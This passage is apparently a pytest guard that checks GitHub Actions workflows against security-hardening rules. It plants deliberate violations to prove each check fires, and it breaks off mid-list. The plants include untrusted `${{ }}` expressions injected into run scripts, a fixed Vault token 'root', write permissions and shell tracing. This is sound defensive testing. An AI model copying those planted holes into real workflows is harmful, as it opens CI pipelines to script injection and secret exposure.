"""Guard for the manual Evidence workflow (.github/workflows/evidence.yml) and its helper tools/evidence_step.py.

Classes guarded (sources: GitHub Actions security hardening guide: least-privilege GITHUB_TOKEN, pin actions to a full
commit SHA, no untrusted ${{ }} inside run scripts; the bash manual on `set -e`, pipelines and `$?`):
  General rules, run on EVERY file in .github/workflows (a new workflow file is covered the day it is added):
  1. permissions: read-only at the top, and read-only if a job sets its own;
  2. every `uses:` is a full 40-hex commit SHA;
  3. no `${{ }}` expression inside any `run:` script (script injection);
  4. every job has a timeout and its steps' timeouts add up to no more than it; every `run:` step has a timeout
     (ci.yml is the one file excused from per-step timeouts: its jobs are bounded by their own timeouts);
  5. nothing hides a failure: no `continue-on-error`, no `|| true`, `|| :`, `|| exit 0` or `set +e` on a line that
     runs tests (in evidence.yml on any line), no step condition that is literally false;
  6. no shell tracing: not in a script, not in `shell:` / `defaults.run.shell`, not through SHELLOPTS,
     BASH_XTRACEFD, PS4, BASH_ENV or the Actions debug switches in any env block.
  Rules for the Vault development server (ci.yml and evidence.yml, see vault_problems):
  7. one random token made in a step, masked before it is used anywhere, never printed, never in a command line;
     the container is published on loopback only, removed by name after the last test step, one pinned image;
     every test step of a job that starts Vault has HADAVIN_TEST_VAULT_ADDR; Vault starts after the install.
  Rules for the Evidence workflow only (evidence_problems):
  8. concurrency never cancels a running evidence run, and the group carries the inputs;
  9. every test/mutant step goes through the helper that records its exit code, under an exact `if`; the verdict
     step is the only one, lists every step and runs after a failure; the log upload runs after a failure or a cancel,
     from exactly ${{ runner.temp }}/evidence-logs/, under a name that is set in the first step;
  10. the helper itself (further down): allowlists refuse odd input, a failing command is recorded and its exit code
     is kept, a step that did not run is NOT RUN and the report fails;
  11. stage names: the check refuses the two old stage words in the workflow (a bare use of the old test-stage word
     elsewhere is not caught; none appears in the workflow today);
  12. the trigger is workflow_dispatch and nothing else, no job has an `if`, and the strategy holds only
     `fail-fast: false` and the Python matrix (so no run can be switched off or widened);
  13. the verdict step is pinned to its exact text (VERDICT_GOLDEN): nothing can be added around the `report` command
     that would let a failing report pass (`; true`, `exit 0`, a pipe, `|| echo`, a trap, `set +o errexit`);
  14. HADAVIN_REQUIRE_PINNED_UNIDATA is written by one step on the Python 3.13 leg only, never set in an env block.

Each rule has an id in square brackets at the start of its message, and every planted violation below names the id
that must fire, so a plant that trips some other rule does not count.

This is a best-effort text check of the workflow, not a proof: it catches the known ways the rules above get broken,
but it cannot prove that no other way exists. The tested code runs as the same user in the same job as the helper, so
it can forge a passing row; the report catches mistakes, not a hostile test. The real protection is the review of
every change to the workflow files.
"""

import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
import yaml
from tools import evidence_step as es

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW_DIR = ROOT / ".github" / "workflows"
WORKFLOW = WORKFLOW_DIR / "evidence.yml"
SHA40 = re.compile(r"^[0-9a-f]{40}$")

# ci.yml is excused from two rules, each for a written reason; every other file gets all rules.
EXCUSED = {
    # its jobs have their own timeouts (15 to 30 minutes), which bound a hanging step just as well
    "ci.yml": {"step-timeout"},
}
# ci.yml keeps `|| true` in two grep counters of the security job (they must not fail the step); there the hiding
# patterns are refused on lines that run tests, and in every other file on every line.
LINE_SCOPED_HIDING = {"ci.yml"}

# The verdict step, code lines only (comments dropped). It must be exactly this: the last command is the report and
# nothing around it can change the exit code the report returns.
VERDICT_GOLDEN = [
    'extra=""',
    'for s in $MUTANTS; do extra="$extra extra-$(basename "$s" .py | tr _ -)"; done',
    'python3 "$TOOL" report install psql-present vault-token-reader pytest perf stage-mutants $extra',
]
VERDICT_KEYS = {"name", "if", "timeout-minutes", "run"}
PINNED_VAR = "HADAVIN_REQUIRE_PINNED_UNIDATA"
PINNED_IF = "${{ matrix.python == '3.13' }}"
PINNED_RUN = f'echo "{PINNED_VAR}=1" >> "$GITHUB_ENV"'
MATRIX_EXPR = "${{ fromJSON(needs.plan.outputs.pythons) }}"
OVERRIDE_ENV = {
    "TOOL",
    "EVIDENCE_DIR",
    "PATH",
}  # names the evidence steps rely on; no env block may set them
# A condition that switches a step off: a bare false, `&& false`, `false &&`, `&& 0`, `&& !true`. A comparison such as
# `draft == false` and a word that only contains "false" are ordinary conditions.
FALSE_RE = re.compile(r"(^|&&|\()\s*(false|0|!true)\b|\b(false|0)\s*&&")

HIDING = re.compile(r"\|\|\s*(true|:|exit\s+0)(\s|$|;|\))")
SET_PLUS_E = re.compile(r"\bset\s+\+e\b")
RUNS_TESTS = re.compile(r"\bpytest\b|\bpython3?\s+(-m\b|tests/|\"?\$s\b)|\buv\s+run\b|\$TOOL")
TRACE_ENV = {
    "SHELLOPTS",
    "BASH_XTRACEFD",
    "PS4",
    "BASH_ENV",
    "ACTIONS_STEP_DEBUG",
    "ACTIONS_RUNNER_DEBUG",
    "RUNNER_DEBUG",
}
TRACING = re.compile(
    r"(^|\s)set\s+-\w*x|xtrace|\b(ba|da|z)?sh\s+-\w*x|\b(SHELLOPTS|BASH_XTRACEFD|PS4|BASH_ENV)\s*="
)
TEST_IFS = {
    "${{ !cancelled() && steps.install.outcome == 'success' }}",
    "${{ !cancelled() && steps.install.outcome == 'success' && needs.plan.outputs.mutants != '' }}",
}
VERDICT_IFS = {"${{ !cancelled() }}", "${{ always() }}"}
UPLOAD_PATH = "${{ runner.temp }}/evidence-logs/"


def load(text: str | None = None) -> dict:
    return yaml.safe_load(text if text is not None else WORKFLOW.read_text(encoding="utf-8"))


def add(out: list[str], rule: str, message: str) -> None:
    out.append(f"[{rule}] {message}")


def logical_lines(script: str) -> list[str]:
    """The code lines of a script: continuation lines joined, blank lines and comment lines dropped."""
    joined = re.sub(r"\\\n\s*", " ", script)
    return [
        ln.strip() for ln in joined.splitlines() if ln.strip() and not ln.lstrip().startswith("#")
    ]


def minutes(step: dict) -> int:
    """The step timeout as a number; an expression or a missing value counts as 0 (the first is reported by its own
    rule)."""
    value = step.get("timeout-minutes", 0)
    return value if isinstance(value, int) else 0


def keys_named(node: object, name: str) -> bool:
    """True if a mapping anywhere inside node has the key `name`."""
    if isinstance(node, dict):
        return name in node or any(keys_named(v, name) for v in node.values())
    if isinstance(node, list):
        return any(keys_named(v, name) for v in node)
    return False


def workflow_problems(text: str, name: str) -> list[str]:
    """The general rules (1 to 6 in the module docstring) for one workflow file. `name` is the file name."""
    wf = load(text)
    excused = EXCUSED.get(name, set())
    out: list[str] = []
    if wf.get("permissions") != {"contents": "read"}:
        add(out, "top-permissions", "top-level permissions must be exactly contents: read")
    if keys_named(wf, "continue-on-error"):
        add(out, "continue-on-error", "continue-on-error lets a failing step pass")
    if (wf.get("defaults") or {}).get("run", {}).get("shell"):
        add(out, "shell-override", "defaults.run.shell changes how every script is run")
    if TRACE_ENV & set(wf.get("env") or {}):
        add(out, "trace-env", "a workflow env name that switches on shell tracing or debug logging")
    for jname, job in wf["jobs"].items():
        if "steps" not in job:
            add(
                out,
                "no-steps",
                f"job {jname}: no steps (a reusable workflow or an empty job is not checked by this guard)",
            )
            continue
        if "permissions" in job and job["permissions"] != {"contents": "read"}:
            add(
                out,
                "job-permissions",
                f"job {jname}: own permissions must be exactly contents: read",
            )
        if "timeout-minutes" not in job:
            add(out, "job-timeout", f"job {jname}: no timeout")
        elif not isinstance(job["timeout-minutes"], int):
            add(out, "expression-timeout", f"job {jname}: the timeout must be a plain number")
        if (job.get("defaults") or {}).get("run", {}).get("shell"):
            add(
                out,
                "shell-override",
                f"job {jname}: defaults.run.shell changes how scripts are run",
            )
        if TRACE_ENV & set(job.get("env") or {}):
            add(
                out,
                "trace-env",
                f"job {jname}: an env name that switches on shell tracing or debug",
            )
        total = sum(minutes(st) for st in job["steps"])
        if isinstance(job.get("timeout-minutes"), int) and total > job["timeout-minutes"]:
            add(
                out,
                "step-sum",
                f"job {jname}: the step timeouts add up to more than the job timeout",
            )
        for i, step in enumerate(job["steps"]):
            label = f"job {jname} step {i} ({step.get('name', step.get('uses'))})"
            if "timeout-minutes" in step and not isinstance(step["timeout-minutes"], int):
                add(out, "expression-timeout", f"{label}: the timeout must be a plain number")
            if "uses" in step and "@" not in str(step["uses"]):
                add(
                    out,
                    "local-action",
                    f"{label}: {step['uses']!r} is a local or docker action; the guard cannot see what it runs",
                )
            elif "uses" in step and not SHA40.match(step["uses"].split("@", 1)[1]):
                add(out, "unpinned", f"{label}: action not pinned to a full commit SHA")
            if step.get("shell"):
                add(
                    out,
                    "shell-override",
                    f"{label}: a shell: override changes how the script is run",
                )
            if TRACE_ENV & set(step.get("env") or {}):
                add(
                    out,
                    "trace-env",
                    f"{label}: an env name that switches on shell tracing or debug",
                )
            if FALSE_RE.search(re.sub(r"\$\{\{|\}\}", "", str(step.get("if", ""))).strip().lower()):
                add(
                    out,
                    "if-false",
                    f"{label}: the step condition is a bare false (the step is switched off)",
                )
            if "run" not in step:
                continue
            run = step["run"]
            if "${{" in run:
                add(
                    out,
                    "injection",
                    f"{label}: ${{{{ }}}} expression inside a run script (script injection)",
                )
            if "timeout-minutes" not in step and "step-timeout" not in excused:
                add(out, "step-timeout", f"{label}: no step timeout")
            if TRACING.search(run):
                add(
                    out,
                    "shell-trace",
                    f"{label}: shell tracing would print every command and value",
                )
            for line in logical_lines(run):
                if SET_PLUS_E.search(line) or (
                    HIDING.search(line)
                    and (name not in LINE_SCOPED_HIDING or RUNS_TESTS.search(line))
                ):
                    add(out, "hiding", f"{label}: '{line[:40]}' hides a failure")
    return out


def problems(text: str) -> list[str]:
    """Every rule broken by the Evidence workflow text (empty list = clean): general rules, the Vault rules and the
    rules for this file only. The plant tests feed it bad text."""
    return [
        *workflow_problems(text, "evidence.yml"),
        *vault_problems(text),
        *evidence_problems(text),
    ]


def evidence_problems(text: str) -> list[str]:
    wf = load(text)
    out: list[str] = []
    on = wf.get("on", wf.get(True))  # YAML 1.1 reads the key `on` as the boolean True
    if not isinstance(on, dict) or set(on) != {"workflow_dispatch"}:
        add(
            out,
            "trigger",
            "the only trigger must be workflow_dispatch (a manual run), nothing else",
        )
    for jname, job in wf["jobs"].items():
        if "if" in job:
            add(out, "job-if", f"job {jname}: a job-level if could switch the whole job off")
        want = (
            {"fail-fast": False, "matrix": {"python": MATRIX_EXPR}} if jname == "evidence" else None
        )
        if job.get("strategy") != want:
            add(
                out,
                "strategy",
                f"job {jname}: the strategy must be exactly fail-fast: false and the Python matrix "
                "(no include, exclude, max-parallel or other key)"
                if want
                else f"job {jname}: no strategy",
            )
    blocks = [wf.get("env") or {}]
    for job in wf["jobs"].values():
        blocks.append(job.get("env") or {})
        blocks += [st.get("env") or {} for st in job.get("steps", [])]
    if any(OVERRIDE_ENV & set(b) for b in blocks):
        add(out, "override-env", f"an env block sets one of {sorted(OVERRIDE_ENV)}")
    if any(PINNED_VAR in b for b in blocks):
        add(
            out,
            "pinned-unidata",
            f"{PINNED_VAR} must not be set in an env block (an empty value on the other legs is still a set value)",
        )
    writers = [
        st
        for job in wf["jobs"].values()
        for st in job.get("steps", [])
        if PINNED_VAR in str(st.get("run", ""))
    ]
    if (
        len(writers) != 1
        or writers[0].get("if") != PINNED_IF
        or logical_lines(writers[0]["run"]) != [PINNED_RUN]
    ):
        add(
            out,
            "pinned-unidata",
            f"exactly one step, with if {PINNED_IF!r}, must run exactly: {PINNED_RUN}",
        )
    conc = wf.get("concurrency") or {}
    if conc.get("cancel-in-progress") is not False:
        add(out, "cancel", "concurrency must set cancel-in-progress: false")
    for needed in ("inputs.ref", "inputs.pythons", "inputs.mutant_scripts"):
        if needed not in str(conc.get("group")):
            add(out, "concurrency-group", f"concurrency group must carry {needed}")
    for jname, job in wf["jobs"].items():
        if job.get("permissions") != {"contents": "read"}:
            add(
                out,
                "job-permissions-own",
                f"job {jname}: must set its own permissions: exactly contents: read",
            )
        if "vault" in (job.get("services") or {}):
            add(
                out,
                "vault-service",
                f"job {jname}: Vault must be a step with a random token, not a service",
            )
        if jname != "plan" and re.search(r"inputs\s*[.\[]", json.dumps(job)):
            add(out, "raw-input", f"job {jname}: reads a raw input; use needs.plan.outputs")
        total = sum(minutes(st) for st in job["steps"])
        if f"add up to {total} minutes" not in text:
            add(
                out,
                "timeout-comment",
                f"the comment on job {jname} must say 'add up to {total} minutes'",
            )
        for i, step in enumerate(job.get("steps", [])):
            label = f"job {jname} step {i} ({step.get('name', step.get('uses'))})"
            if "uses" in step and "timeout-minutes" not in step:
                add(out, "uses-timeout", f"{label}: a uses: step needs a timeout too")
            if "run" in step:
                run = step["run"]
                for line in logical_lines(run):
                    if (
                        RUNS_TESTS.search(line)
                        and "evidence_step.py" not in line
                        and "$TOOL" not in line
                    ):
                        add(
                            out,
                            "bare-test",
                            f"{label}: runs tests without the helper that records the exit code",
                        )
                is_verdict = re.search(r"\$TOOL\"? report\b", run)
                if is_verdict and (
                    logical_lines(run) != VERDICT_GOLDEN or set(step) - VERDICT_KEYS
                ):
                    add(
                        out,
                        "verdict-golden",
                        f"{label}: the verdict step must be exactly the pinned text, with only the keys "
                        f"{sorted(VERDICT_KEYS)}",
                    )
                if is_verdict and step.get("if") not in VERDICT_IFS:
                    add(
                        out,
                        "verdict-if",
                        f"{label}: the verdict's if must be exactly !cancelled() or always()",
                    )
                runs_test_step = re.search(
                    r"\$TOOL\"? run (pytest|perf|stage-mutants)\b|run \"\$name\"", run
                )
                if runs_test_step and step.get("if") not in TEST_IFS:
                    add(
                        out,
                        "test-if",
                        f"{label}: the if must be one of the two exact forms that wait for the install",
                    )
            if str(step.get("uses", "")).startswith("actions/upload-artifact"):
                if step.get("if") != "${{ always() }}":
                    add(out, "upload-always", f"{label}: the upload must run with always()")
                path = str((step.get("with") or {}).get("path", ""))
                if path != UPLOAD_PATH:
                    add(
                        out,
                        "upload-path",
                        f"{label}: the upload path must be exactly {UPLOAD_PATH}",
                    )
                art = str((step.get("with") or {}).get("name", ""))
                if "env.ART" not in art or "matrix.python" not in art:
                    add(
                        out,
                        "upload-name",
                        f"{label}: the name must be env.ART with a fallback that holds matrix.python",
                    )
            if str(step.get("uses", "")).startswith("actions/checkout") and (
                step.get("with") or {}
            ).get("path"):
                add(
                    out,
                    "second-checkout",
                    f"job {jname}: a second checkout inside the workspace is not allowed",
                )
    steps = [st for job in wf["jobs"].values() for st in job.get("steps", []) if "run" in st]
    literal = [m for st in steps for m in re.findall(r'\$TOOL" run ([a-z0-9-]+) --', st["run"])]
    reports = [st["run"] for st in steps if re.search(r'\$TOOL" report\b', st["run"])]
    if len(reports) != 1:
        add(out, "one-verdict", "exactly one verdict (report) step is needed")
    else:
        for name in literal:
            if name not in reports[0]:
                add(
                    out,
                    "verdict-lists",
                    f"the verdict does not list the step {name!r}, so it could not fail on NOT RUN",
                )
        if "extra-$(basename" not in reports[0]:
            add(
                out, "verdict-extra", "the verdict must build the extra- names of the extra runners"
            )
        if not re.search(r'\$TOOL" report [^\n]*\$extra\b', reports[0]):
            add(out, "verdict-extra-arg", "the verdict's report command must be given $extra")
    for st in steps:
        if 'run "$name"' in st["run"] and "name=extra-$(basename" not in st["run"]:
            add(
                out,
                "extra-prefix",
                "extra runner step names must start with extra- (no clash with built-in steps)",
            )
    if "vault-token-reader" not in literal:
        add(
            out,
            "token-reader-missing",
            "the tested ref must be checked for the token reader (step vault-token-reader)",
        )
    for st in steps:
        if "docker ps" in st["run"] and "xargs" in st["run"] and "name=^vault-ci$" not in st["run"]:
            add(
                out,
                "docker-filter",
                "the docker name filter must be an exact match ('name=^vault-ci$')",
            )
        if (
            "run vault-token-reader" in st["run"]
            and "token-reader tests/contracts/kinds/secrets_neutral.py" not in st["run"]
        ):
            add(
                out,
                "token-reader-command",
                "vault-token-reader must run the helper's token-reader on secrets_neutral.py",
            )
    tr_form = 'extra-$(basename "$s" .py | tr _ -)'
    for st in steps:
        if "extra-$(basename" in st["run"] and st["run"].count(tr_form) != st["run"].count(
            "extra-$(basename"
        ):
            add(
                out,
                "tr-form",
                "the extra- name must be built the same way (with tr _ -) in the loop and in the verdict",
            )
    if re.search(r"VAULT_DEV_ROOT_TOKEN_ID:\s*root\b", text) or re.search(
        r"\btoken\W+root\b", text
    ):
        add(out, "fixed-token", "fixed Vault token 'root'")
    if re.search(r"\b(staging)\b|\bstage\W+dev\b", text, re.IGNORECASE):
        add(out, "stage-name", "a stage name other than demo, pilot or prod")
    if ".evidence-tools" in text:
        add(out, "helper-inside", "the helper must not live inside the checkout (.evidence-tools)")
    if "EVIDENCE_DIR=$RUNNER_TEMP/evidence-logs" not in text:
        add(out, "evidence-dir", "EVIDENCE_DIR must be set to $RUNNER_TEMP/evidence-logs")
    cols = str((wf["jobs"]["evidence"].get("env") or {}).get("COLUMNS", ""))
    if not cols.isdigit() or int(cols) < 200:
        add(
            out,
            "columns",
            "COLUMNS must be wide (at least 200) so that pytest does not cut a printed value",
        )
    first = wf["jobs"]["evidence"]["steps"][0]
    art_lines = [ln for st in steps for ln in st["run"].splitlines() if re.search(r"\bART=", ln)]
    if (
        len(art_lines) != 1
        or "ART=" not in first.get("run", "")
        or "${SHA:0:8}" not in first.get("run", "")
        or "${PY}" not in first.get("run", "")
        or "needs.plan.outputs.sha" not in json.dumps(wf["jobs"]["evidence"].get("env", {}))
    ):
        add(
            out,
            "art-first",
            "ART must be set once, in the first step, from the plan job's sha and the Python version",
        )
    return out


def test_the_current_workflow_breaks_no_rule():
    assert problems(WORKFLOW.read_text(encoding="utf-8")) == []


def workflow_files(folder: Path) -> list[Path]:
    """Every workflow file of a folder: GitHub reads both .yml and .yaml."""
    return sorted([*folder.glob("*.yml"), *folder.glob("*.yaml")])


WORKFLOWS = workflow_files(WORKFLOW_DIR)


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_workflow_file_meets_the_general_rules(path):
    assert workflow_problems(path.read_text(encoding="utf-8"), path.name) == []


def test_a_new_workflow_file_gets_every_general_rule():
    bad = (
        "name: New\non: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    steps:\n"
        "      - uses: actions/checkout@v4\n      - run: echo ${{ github.event.head_commit.message }} || true\n"
    )
    found = workflow_problems(bad, "new.yml")
    for rule in (
        "top-permissions",
        "job-timeout",
        "unpinned",
        "injection",
        "step-timeout",
        "hiding",
    ):
        assert any(p.startswith(f"[{rule}]") for p in found), (rule, found)


def test_the_two_excused_rules_are_the_only_exceptions():
    assert EXCUSED == {"ci.yml": {"step-timeout"}} and LINE_SCOPED_HIDING == {"ci.yml"}
    assert all((WORKFLOW_DIR / name).is_file() for name in EXCUSED)


# A plant is (how to break the text, id of the rule that must fire). The rule is looked for by id, so a plant that
# happens to trip some other rule does not count.
PLANTS = {
    "write permission": (
        lambda t: t.replace("permissions:\n  contents: read", "permissions:\n  contents: write", 1),
        "top-permissions",
    ),
    "job write permission": (
        lambda t: t.replace(
            "    timeout-minutes: 170  # the step timeouts below add up to 166 minutes; the rest is for starting the job\n    permissions:\n      contents: read",
            "    timeout-minutes: 170  # the step timeouts below add up to 166 minutes; the rest is for starting the job\n    permissions:\n      contents: write",
        ),
        "job-permissions",
    ),
    "job without own permissions": (
        lambda t: t.replace(
            "the rest is for starting the job\n    permissions:\n      contents: read\n",
            "the rest is for starting the job\n",
        ),
        "job-permissions-own",
    ),
    "cancel in progress": (
        lambda t: t.replace("cancel-in-progress: false", "cancel-in-progress: true"),
        "cancel",
    ),
    "unpinned action": (
        lambda t: re.sub(r"(actions/upload-artifact)@[0-9a-f]{40}", r"\1@v7", t),
        "unpinned",
    ),
    "injection": (
        lambda t: t.replace(
            'run: python3 "$TOOL" run psql-present -- psql --version',
            "run: echo ${{ inputs.ref }}",
        ),
        "injection",
    ),
    "no step timeout": (
        lambda t: t.replace(
            '        timeout-minutes: 2\n        run: python3 "$TOOL" run psql-present',
            '        run: python3 "$TOOL" run psql-present',
        ),
        "step-timeout",
    ),
    "no job timeout": (
        lambda t: re.sub(r"    timeout-minutes: 170[^\n]*\n", "", t),
        "job-timeout",
    ),
    "step timeouts above the job timeout": (
        lambda t: t.replace("timeout-minutes: 170", "timeout-minutes: 100"),
        "step-sum",
    ),
    "timeout comment wrong": (lambda t: t.replace("166 minutes", "135 minutes"), "timeout-comment"),
    "plan timeout comment wrong": (
        lambda t: t.replace("add up to 11 minutes", "add up to 9 minutes"),
        "timeout-comment",
    ),
    "fixed vault token": (
        lambda t: t.replace("token=$(openssl rand -hex 24)", "token=root\n          # token root"),
        "fixed-token",
    ),
    "or true": (lambda t: t.replace("exit $fail", "exit $fail || true"), "hiding"),
    "or colon": (lambda t: t.replace("exit $fail", "exit $fail || :"), "hiding"),
    "or exit 0": (lambda t: t.replace("exit $fail", "exit $fail || exit 0"), "hiding"),
    "set +e": (
        lambda t: t.replace("          fail=0\n", "          set +e\n          fail=0\n"),
        "hiding",
    ),
    "continue on error in a step": (
        lambda t: t.replace(
            "      - name: Performance tests\n",
            "      - name: Performance tests\n        continue-on-error: true\n",
        ),
        "continue-on-error",
    ),
    "continue on error in the job": (
        lambda t: t.replace("    needs: plan\n", "    needs: plan\n    continue-on-error: true\n"),
        "continue-on-error",
    ),
    "verdict switched off": (
        lambda t: t.replace(
            "        if: ${{ !cancelled() }}\n        timeout-minutes: 2\n        run: |\n          extra=",
            "        if: ${{ !cancelled() && false }}\n        timeout-minutes: 2\n        run: |\n          extra=",
        ),
        "verdict-if",
    ),
    "verdict switched off, step condition false": (
        lambda t: t.replace(
            "        if: ${{ !cancelled() }}\n        timeout-minutes: 2\n        run: |\n          extra=",
            "        if: ${{ !cancelled() && false }}\n        timeout-minutes: 2\n        run: |\n          extra=",
        ),
        "if-false",
    ),
    "upload without always": (
        lambda t: t.replace(
            "        if: ${{ always() }}\n        timeout-minutes: 5\n        uses:",
            "        timeout-minutes: 5\n        uses:",
        ),
        "upload-always",
    ),
    "upload path wider than the logs": (
        lambda t: t.replace("path: ${{ runner.temp }}/evidence-logs/", "path: ${{ runner.temp }}/"),
        "upload-path",
    ),
    "upload path in the checkout": (
        lambda t: t.replace("path: ${{ runner.temp }}/evidence-logs/", "path: evidence-logs/"),
        "upload-path",
    ),
    "upload name without a fallback": (
        lambda t: t.replace(
            "env.ART || format('evidence-{0}-{1}', matrix.python, github.run_attempt)", "env.ART"
        ),
        "upload-name",
    ),
    "name set late": (
        lambda t: t.replace(
            '          echo "ART=evidence-${safe}-${SHA:0:8}-${PY}-${GITHUB_RUN_ATTEMPT}" >> "$GITHUB_ENV"\n',
            "          true\n",
        ).replace(
            "      - name: Runner facts\n        timeout-minutes: 2\n        run: |\n",
            '      - name: Runner facts\n        timeout-minutes: 2\n        run: |\n          echo "ART=evidence-late" >> "$GITHUB_ENV"\n',
        ),
        "art-first",
    ),
    "bare pytest": (
        lambda t: t.replace('run: python3 "$TOOL" run perf -- pytest', "run: pytest"),
        "bare-test",
    ),
    "no timeout on a uses step": (
        lambda t: t.replace(
            'cache-suffix: "evidence"\n        timeout-minutes: 5\n', 'cache-suffix: "evidence"\n'
        ),
        "uses-timeout",
    ),
    "verdict only on success": (
        lambda t: t.replace(
            "a step that did not run is NOT RUN)\n        if: ${{ !cancelled() }}",
            "a step that did not run is NOT RUN)\n        if: ${{ success() }}",
        ),
        "verdict-if",
    ),
    "vault removal without always": (
        lambda t: t.replace(
            "      - name: Remove the Vault development server\n        if: ${{ always() }}",
            "      - name: Remove the Vault development server\n        if: ${{ success() }}",
        ),
        "removal-always",
    ),
    "tests not waiting for install": (
        lambda t: t.replace(
            "        if: ${{ !cancelled() && steps.install.outcome == 'success' }}\n        timeout-minutes: 20\n        run: python3 \"$TOOL\" run perf",
            '        if: ${{ !cancelled() }}\n        timeout-minutes: 20\n        run: python3 "$TOOL" run perf',
        ),
        "test-if",
    ),
    "tests switched off by an extra clause": (
        lambda t: t.replace(
            "        if: ${{ !cancelled() && steps.install.outcome == 'success' }}\n        timeout-minutes: 20\n        run: python3 \"$TOOL\" run perf",
            "        if: ${{ !cancelled() && steps.install.outcome == 'success' && 1 == 2 }}\n        timeout-minutes: 20\n        run: python3 \"$TOOL\" run perf",
        ),
        "test-if",
    ),
    "report forgets a step": (
        lambda t: t.replace(
            "report install psql-present vault-token-reader pytest perf",
            "report install psql-present vault-token-reader pytest",
        ),
        "verdict-lists",
    ),
    "report forgets the extra runners": (
        lambda t: t.replace("stage-mutants $extra", "stage-mutants"),
        "verdict-extra-arg",
    ),
    "two verdict steps": (
        lambda t: t.replace(
            "      - name: Remove the Vault development server\n",
            '      - name: Second verdict\n        timeout-minutes: 2\n        run: python3 "$TOOL" report install\n'
            "      - name: Remove the Vault development server\n",
            1,
        ),
        "one-verdict",
    ),
    "verdict without the extra names": (
        lambda t: t.replace(
            'extra="$extra extra-$(basename "$s" .py | tr _ -)"',
            'extra="$extra $(basename "$s" .py | tr _ -)"',
        ),
        "verdict-extra",
    ),
    "uv run bare": (
        lambda t: t.replace(
            'run: python3 "$TOOL" run pytest -- pytest -q -m "not live and not perf" -rfEs',
            "run: uv run ruff check",
        ),
        "bare-test",
    ),
    "python -m bare": (
        lambda t: t.replace(
            'run: python3 "$TOOL" run perf -- pytest -q -m perf -rfEs', "run: python -m json.tool x"
        ),
        "bare-test",
    ),
    "python tests path bare": (
        lambda t: t.replace(
            'run: python3 "$TOOL" run stage-mutants -- python tests/stage_mutants.py',
            "run: python tests/stage_mutants.py",
        ),
        "bare-test",
    ),
    "python runner variable bare": (
        lambda t: t.replace("          exit $fail", '          python "$s"\n          exit $fail'),
        "bare-test",
    ),
    "tr changed on one side": (
        lambda t: t.replace(
            'extra="$extra extra-$(basename "$s" .py | tr _ -)"',
            'extra="$extra extra-$(basename "$s" .py)"',
        ),
        "tr-form",
    ),
    "token reader command replaced": (
        lambda t: t.replace(
            'python3 "$TOOL" token-reader tests/contracts/kinds/secrets_neutral.py', "true"
        ),
        "token-reader-command",
    ),
    "docker filter substring": (
        lambda t: t.replace("'name=^vault-ci$'", "name=vault-ci"),
        "docker-filter",
    ),
    "concurrency without runners": (
        lambda t: t.replace("-${{ inputs.mutant_scripts }}\n  cancel", "\n  cancel"),
        "concurrency-group",
    ),
    "extra runner without prefix": (
        lambda t: t.replace("name=extra-$(basename", "name=$(basename"),
        "extra-prefix",
    ),
    "no token reader check": (
        lambda t: t.replace("run vault-token-reader --", "run vault-token-reader-x --"),
        "token-reader-missing",
    ),
    "vault as a service": (
        lambda t: t.replace(
            "    services:\n      postgres:",
            "    services:\n      vault:\n        image: x\n      postgres:",
        ),
        "vault-service",
    ),
    "staging stage": (lambda t: t + "\n# stage: " + "stag" + "ing\n", "stage-name"),
    "stage dev": (lambda t: t + "\n# stage: " + "de" + "v\n", "stage-name"),
    "evidence dir not under runner temp": (
        lambda t: t.replace(
            "EVIDENCE_DIR=$RUNNER_TEMP/evidence-logs", "EVIDENCE_DIR=evidence-logs"
        ),
        "evidence-dir",
    ),
    "helper inside the checkout": (lambda t: t + "\n# path: .evidence-tools\n", "helper-inside"),
    "narrow terminal": (lambda t: t.replace('COLUMNS: "300"', 'COLUMNS: "80"'), "columns"),
    "second checkout in the workspace": (
        lambda t: t.replace(
            "      - name: Runner facts",
            "      - uses: actions/checkout@"
            + "0" * 40
            + "\n        timeout-minutes: 5\n        with:\n          path: .evidence-x\n"
            "      - name: Runner facts",
            1,
        ),
        "second-checkout",
    ),
    "raw input in the evidence job": (
        lambda t: t.replace(
            "      PY: ${{ matrix.python }}",
            "      PY: ${{ matrix.python }}\n      X: ${{ github.event.inputs.ref }}",
        ),
        "raw-input",
    ),
    "raw input by index": (
        lambda t: t.replace(
            "      PY: ${{ matrix.python }}",
            "      PY: ${{ matrix.python }}\n      X: ${{ inputs['ref'] }}",
        ),
        "raw-input",
    ),
    "tracing in a script": (
        lambda t: t.replace("          fail=0\n", "          set -x\n          fail=0\n"),
        "shell-trace",
    ),
    "tracing by shell flag": (
        lambda t: t.replace("          fail=0\n", "          bash -x ./x\n          fail=0\n"),
        "shell-trace",
    ),
    "tracing by default shell": (
        lambda t: t.replace(
            "jobs:\n  plan:", "defaults:\n  run:\n    shell: bash -x {0}\n\njobs:\n  plan:"
        ),
        "shell-override",
    ),
    "tracing by job default shell": (
        lambda t: t.replace(
            "    needs: plan\n",
            "    needs: plan\n    defaults:\n      run:\n        shell: bash -x {0}\n",
        ),
        "shell-override",
    ),
    "tracing by shellopts": (
        lambda t: t.replace(
            "      PYTHONUNBUFFERED:", "      SHELLOPTS: xtrace\n      PYTHONUNBUFFERED:"
        ),
        "trace-env",
    ),
    "verdict ends with true": (
        lambda t: t.replace("stage-mutants $extra", "stage-mutants $extra; true"),
        "verdict-golden",
    ),
    "verdict then exit 0": (
        lambda t: t.replace("stage-mutants $extra", "stage-mutants $extra\n          exit 0"),
        "verdict-golden",
    ),
    "verdict piped to tee": (
        lambda t: t.replace("stage-mutants $extra", "stage-mutants $extra | tee /dev/null"),
        "verdict-golden",
    ),
    "verdict or echo": (
        lambda t: t.replace("stage-mutants $extra", "stage-mutants $extra || echo ignored"),
        "verdict-golden",
    ),
    "verdict with a trap": (
        lambda t: t.replace(
            '          python3 "$TOOL" report install',
            "          trap 'exit 0' EXIT\n" + '          python3 "$TOOL" report install',
        ),
        "verdict-golden",
    ),
    "verdict with errexit off": (
        lambda t: t.replace(
            '          python3 "$TOOL" report install',
            "          set +o errexit\n" + '          python3 "$TOOL" report install',
        ),
        "verdict-golden",
    ),
    "verdict in the background": (
        lambda t: t.replace("stage-mutants $extra", "stage-mutants $extra &"),
        "verdict-golden",
    ),
    "verdict and then more": (
        lambda t: t.replace("stage-mutants $extra", "stage-mutants $extra && echo done"),
        "verdict-golden",
    ),
    "verdict with its own env": (
        lambda t: t.replace(
            "      - name: Verdict (fails unless every step has exit=0; a step that did not run is NOT RUN)\n",
